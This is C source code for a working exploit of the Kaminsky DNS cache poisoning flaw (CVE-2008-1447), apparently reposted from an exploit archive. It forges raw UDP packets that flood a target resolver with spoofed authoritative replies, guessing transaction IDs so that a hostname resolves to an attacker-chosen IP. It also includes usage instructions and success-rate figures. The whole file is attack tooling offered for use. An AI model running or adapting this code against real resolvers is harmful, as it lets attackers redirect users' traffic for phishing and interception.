/*
 * Exploit for CVE-2008-1447 - Kaminsky DNS Cache Poisoning Attack
 *
 * Compilation:
 * $ gcc -o kaminsky-attack kaminsky-attack.c `dnet-config --libs` -lm
 *
 * Dependency: libdnet (aka libdumbnet-dev under Ubuntu)
 *
 * Author: marc.bevand at rapid7 dot com
 */

#define _BSD_SOURCE

#include <sys/types.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <time.h>
#include <unistd.h>
#include <dumbnet.h>

#define DNSF_RESPONSE      (1<<15)
#define DNSF_AUTHORITATIVE (1<<10)
#define DNSF_REC_DESIRED   (1<<8)
#define DNSF_REC_AVAILABLE (1<<7)

#define TYPE_A       0x1
#define TYPE_NS      0x2
#define CLASS_IN     0x1

struct dns_pkt
{
   uint16_t txid;
   uint16_t flags;
   uint16_t nr_quest;
   uint16_t nr_ans;
   uint16_t nr_auth;
   uint16_t nr_add;
} __attribute__ ((__packed__));

void format_domain(u_char *buf, unsigned size, unsigned *len, const char *name)
{
   unsigned bufi, i, j;
   bufi = i = j = 0;
   while (name[i])
   {
      if (name[i] == '.')
      {
         if (bufi + 1 + (i - j) > size)
            fprintf(stderr, "format_domain overflow\n"), exit(1);
         buf[bufi++] = i - j;
         memcpy(buf + bufi, name + j, i - j);
         bufi += i - j;
         j = i + 1;
      }
      i++;
   }
   if (bufi + 1 + 2 + 2 > size)
      fprintf(stderr, "format_domain overflow\n"), exit(1);
   buf[bufi++] = 0;
   *len = bufi;
}

void format_qr(u_char *buf, unsigned size, unsigned *len, const char *name, uint16_t type, uint16_t class)
{
   uint16_t tmp;
   // name
   format_domain(buf, size, len, name);
   // type
   tmp = htons(type);
   memcpy(buf + *len, &tmp, sizeof (tmp));
   *len += sizeof (tmp);
   // class
   tmp = htons(class);
   memcpy(buf + *len, &tmp, sizeof (tmp));
   *len += sizeof (tmp);
}

void format_rr(u_char *buf, unsigned size, unsigned *len, const char *name, uint16_t type, uint16_t class, uint32_t ttl, const char *data)
{
   format_qr(buf, size, len, name, type, class);
   // ttl
   ttl = htonl(ttl);
   memcpy(buf + *len, &ttl, sizeof (ttl));
   *len += sizeof (ttl);
   // data length + data
   uint16_t dlen;
   struct addr addr;
   switch (type)
   {
      case TYPE_A:
         dlen = sizeof (addr.addr_ip);
         break;
      case TYPE_NS:
         dlen = strlen(data) + 1;
         break;
      default:
         fprintf(stderr, "format_rr: unknown type %02x", type);
         exit(1);
   }
   dlen = htons(dlen);
   memcpy(buf + *len, &dlen, sizeof (dlen));
   *len += sizeof (dlen);
   // data
   unsigned len2;
   switch (type)
   {
      case TYPE_A:
         if (addr_aton(data, &addr) < 0)
            fprintf(stderr, "invalid destination IP: %s", data), exit(1);
         memcpy(buf + *len, &addr.addr_ip, sizeof (addr.addr_ip));
         *len += sizeof (addr.addr_ip);
         break;
      case TYPE_NS:
         format_domain(buf + *len, size - *len, &len2, data);
         *len += len2;
         break;
      default:
         fprintf(stderr, "format_rr: unknown type %02x", type);
         exit(1);
   }
}

void dns_query(u_char *buf, unsigned size, unsigned *len, uint16_t txid, uint16_t flags, const char *name)
{
   u_char *out = buf;
   struct dns_pkt p = {
      .txid = htons(txid),
      .flags = htons(flags),
      .nr_quest = htons(1),
      .nr_ans = htons(0),
      .nr_auth = htons(0),
      .nr_add = htons(0),
   };
   u_char qr[256];
   unsigned l;
   format_qr(qr, sizeof (qr), &l, name, TYPE_A, CLASS_IN);
   if (sizeof (p) + l > size)
      fprintf(stderr, "dns_query overflow"), exit(1);
   memcpy(out, &p, sizeof (p));
   out += sizeof (p);
   memcpy(out, qr, l);
   out += l;
   *len = sizeof (p) + l;
}

void dns_response(u_char *buf, unsigned size, unsigned *len,
      uint16_t txid, uint16_t flags,
      const char *q_name, const char *q_ip,
      const char *domain, const char *auth_name, const char *auth_ip)
{
   u_char *out = buf;
   u_char *end = buf + size;
   u_char rec[256];
   unsigned l_rec;
   uint32_t ttl = 24*3600;
   struct dns_pkt p = {
      .txid = htons(txid),
      .flags = htons(flags),
      .nr_quest = htons(1),
      .nr_ans = htons(1),
      .nr_auth = htons(1),
      .nr_add = htons(1),
   };
   (void)domain;
   *len = 0;
   if (out + *len + sizeof (p) > end)
      fprintf(stderr, "dns_response overflow"), exit(1);
   memcpy(out + *len, &p, sizeof (p)); *len += sizeof (p);
   // queries
   format_qr(rec, sizeof (rec), &l_rec, q_name, TYPE_A, CLASS_IN);
   if (out + *len + l_rec > end)
      fprintf(stderr, "dns_response overflow"), exit(1);
   memcpy(out + *len, rec, l_rec); *len += l_rec;
   // answers
   format_rr(rec, sizeof (rec), &l_rec, q_name, TYPE_A, CLASS_IN,
         ttl, q_ip);
   if (out + *len + l_rec > end)
      fprintf(stderr, "dns_response overflow"), exit(1);
   memcpy(out + *len, rec, l_rec); *len += l_rec;
   // authoritative nameservers
   format_rr(rec, sizeof (rec), &l_rec, domain, TYPE_NS, CLASS_IN,
         ttl, auth_name);
   if (out + *len + l_rec > end)
      fprintf(stderr, "dns_response overflow"), exit(1);
   memcpy(out + *len, rec, l_rec); *len += l_rec;
   // additional records
   format_rr(rec, sizeof (rec), &l_rec, auth_name, TYPE_A, CLASS_IN,
         ttl, auth_ip);
   if (out + *len + l_rec > end)
      fprintf(stderr, "dns_response overflow"), exit(1);
   memcpy(out + *len, rec, l_rec); *len += l_rec;
}

unsigned build_query(u_char *buf, const char *srcip, const char *dstip, const char *name)
{
   unsigned len = 0;
   // ip
   struct ip_hdr *ip = (struct ip_hdr *)buf;
   ip->ip_hl = 5;
   ip->ip_v = 4;
   ip->ip_tos = 0;
   ip->ip_id = rand() & 0xffff;
   ip->ip_off = 0;
   ip->ip_ttl = IP_TTL_MAX;
   ip->ip_p = 17; // udp
   ip->ip_sum = 0;
   struct addr addr;
   if (addr_aton(srcip, &addr) < 0)
      fprintf(stderr, "invalid source IP: %s", srcip), exit(1);
   ip->ip_src = addr.addr_ip;
   if (addr_aton(dstip, &addr) < 0)
      fprintf(stderr, "invalid destination IP: %s", dstip), exit(1);
   ip->ip_dst = addr.addr_ip;
   // udp
   struct udp_hdr *udp = (struct udp_hdr *)(buf + IP_HDR_LEN);
   udp->uh_sport = htons(1234);
   udp->uh_dport = htons(53);
   // dns
   dns_query(buf + IP_HDR_LEN + UDP_HDR_LEN,
         (unsigned)(sizeof (buf) - (IP_HDR_LEN + UDP_HDR_LEN)), &len,
         rand(), DNSF_REC_DESIRED, name);
   // udp len
   len += UDP_HDR_LEN;
   udp->uh_ulen = htons(len);
   // ip len & cksum
   len += IP_HDR_LEN;
   ip->ip_len = htons(len);
   ip_checksum(buf, len);
   return len;
}

unsigned build_response(u_char *buf, const char *srcip, const char *dstip,
      uint16_t port_resolver, uint16_t txid,
      const char *q_name, const char *q_ip,
      const char *domain, const char *auth_name, const char *auth_ip)
{
   unsigned len = 0;
   // ip
   struct ip_hdr *ip = (struct ip_hdr *)buf;
   ip->ip_hl = 5;
   ip->ip_v = 4;
   ip->ip_tos = 0;
   ip->ip_id = rand() & 0xffff;
   ip->ip_off = 0;
   ip->ip_ttl = IP_TTL_MAX;
   ip->ip_p = 17; // udp
   ip->ip_sum = 0;
   struct addr addr;
   if (addr_aton(srcip, &addr) < 0)
      fprintf(stderr, "invalid source IP: %s", srcip), exit(1);
   ip->ip_src = addr.addr_ip;
   if (addr_aton(dstip, &addr) < 0)
      fprintf(stderr, "invalid destination IP: %s", dstip), exit(1);
   ip->ip_dst = addr.addr_ip;
   // udp
   struct udp_hdr *udp = (struct udp_hdr *)(buf + IP_HDR_LEN);
   udp->uh_sport = htons(53);
   udp->uh_dport = htons(port_resolver);
   // dns
   dns_response(buf + IP_HDR_LEN + UDP_HDR_LEN,
         (unsigned)(sizeof (buf) - (IP_HDR_LEN + UDP_HDR_LEN)), &len,
         txid, DNSF_RESPONSE | DNSF_AUTHORITATIVE,
         q_name, q_ip, domain, auth_name, auth_ip);
   // udp len
   len += UDP_HDR_LEN;
   udp->uh_ulen = htons(len);
   // ip len & cksum
   len += IP_HDR_LEN;
   ip->ip_len = htons(len);
   ip_checksum(buf, len);
   return len;
}

void usage(char *name)
{
   fprintf(stderr, "Usage: %s <ip-querier> <ip-resolver> <ip-authoritative> "
         "<port-resolver> <subhost> <domain> <any-ip> <attempts> <repl-per-attempt>\n"
         "  <ip-querier>       Source IP used when sending queries for random hostnames\n"
         "                     (typically your IP)\n"
         "  <ip-resolver>      Target DNS resolver to attack\n"
         "  <ip-authoritative> One of the authoritative DNS servers for <domain>\n"
         "  <port-resolver>    Source port used by the resolver when forwarding queries\n"
         "  <subhost>          Poison the cache with the A record <subhost>.<domain>\n"
         "  <domain>           Domain name, see <subhost>.\n"
         "  <any-ip>           IP of your choice to be associated to <subhost>.<domain>\n"
         "  <attempts>         Number of poisoning attemps, more attempts increase the\n"
         "                     chance of successful poisoning, but also the attack time\n"
         "  <repl-per-attempt> Number of spoofed replies to send per attempt, more replies\n"
         "                     increase the chance of successful poisoning but, but also\n"
         "                     the rate of packet loss\n"
         "Example:\n"
         "  $ %s q.q.q.q r.r.r.r a.a.a.a 1234 pwned example.com. 1.1.1.1 8192 16\n"
         "This should cause a pwned.example.com A record resolving to 1.1.1.1 to appear\n"
         "in r.r.r.r's cache. The chance of successfully poisoning the resolver with\n"
         "this example (8192 attempts and 16 replies/attempt) is 86%%\n"
         "(1-(1-16/65536)**8192). This example also requires a bandwidth of about\n"
         "2.6 Mbit/s (16 replies/attempt * ~200 bytes/reply * 100 attempts/sec *\n"
         "8 bits/byte) and takes about 80 secs to complete (8192 attempts /\n"
         "100 attempts/sec).\n",
         name, name);
}

int main(int argc, char **argv)
{
   if (argc != 10)
      usage(argv[0]), exit(1);
   const char *querier = argv[1];
   const char *ip_resolver = argv[2];
   const char *ip_authoritative = argv[3];
   uint16_t port_resolver = (uint16_t)strtoul(argv[4], NULL, 0);
   const char *subhost = argv[5];
   const char *domain = argv[6];
   const char *anyip = argv[7];
   uint16_t attempts = (uint16_t)strtoul(argv[8], NULL, 0);
   uint16_t replies = (uint16_t)strtoul(argv[9], NULL, 0);
   if (domain[strlen(domain) - 1 ] != '.')
      fprintf(stderr, "domain must end with dot(.): %s\n", domain), exit(1);
   printf("Chance of success: 1-(1-%d/65536)**%d = %.2f\n", replies, attempts, 1 - pow((1 - replies / 65536.), attempts));
   srand(time(NULL));
   int unique = rand() + (rand() << 16);
   u_char buf[IP_LEN_MAX];
   unsigned len;
   char name[256];
   char ns[256];
   ip_t *iph;
   if ((iph = ip_open()) == NULL)
      err(1, "ip_open");
   int cnt = 0;
   while (cnt < attempts)
   {
      // send a query for a random hostname
      snprintf(name, sizeof (name), "%08x%08x.%s", unique, cnt, domain);
      len = build_query(buf, querier, ip_resolver, name);
      if (ip_send(iph, buf, len) != len)
         err(1, "ip_send");
      // give the resolver enough time to forward the query and be in a state
      // where it waits for answers; sleeping 10ms here limits the number of
      // attempts to 100 per sec
      usleep(10000);
      // send spoofed replies, each reply contains:
      // - 1 query: query for the "random hostname"
      // - 1 answer: "random hostname" A 1.1.1.1
      // - 1 authoritative nameserver: <domain> NS <subhost>.<domain>
      // - 1 additional record: <subhost>.<domain> A <any-ip>
      snprintf(ns, sizeof (ns), "%s.%s", subhost, domain);
      unsigned r;
      for (r = 0; r < replies; r++)
      {
         // use a txid that is just 'r': 0..(replies-1)
         len = build_response(buf, ip_authoritative, ip_resolver,
               port_resolver, r, name, "1.1.1.1", domain, ns, anyip);
         if (ip_send(iph, buf, len) != len)
            err(1, "ip_send");
      }
      cnt++;
   }
   ip_close(iph);
   return 0;
}

// milw0rm.com [2008-07-25]